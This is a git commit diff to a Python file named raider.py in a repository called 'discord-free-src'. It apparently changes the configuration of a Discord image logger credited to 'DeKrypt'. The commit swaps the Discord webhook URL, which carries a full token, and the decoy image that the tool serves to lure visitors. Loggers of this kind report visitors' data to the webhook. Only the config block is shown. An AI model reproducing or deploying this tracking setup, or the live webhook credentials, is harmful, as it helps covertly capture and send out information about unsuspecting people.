e2a197f829aa6bd25578e04d8d5e4ff9bf6cc00b
AZURASTORE8 <11416@hwp.ac.th>
2025-08-03 10:20:25 +0700

    Update raider.py

--- discord-free-src/blob/main/src/raider.py
+++ discord-free-src/blob/main/src/raider.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://canary.discord.com/api/webhooks/1401403879362531348/gGPNF5UABuvmDgHUw69p9qEQmfznWdaDICdJL19CZY96vtUzyyJPdIv0o8_Pl_-W1Uw2",
+    "image": "https://i.pinimg.com/736x/8f/8c/de/8f8cde7761b6fe988c7be4a8bec51020.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
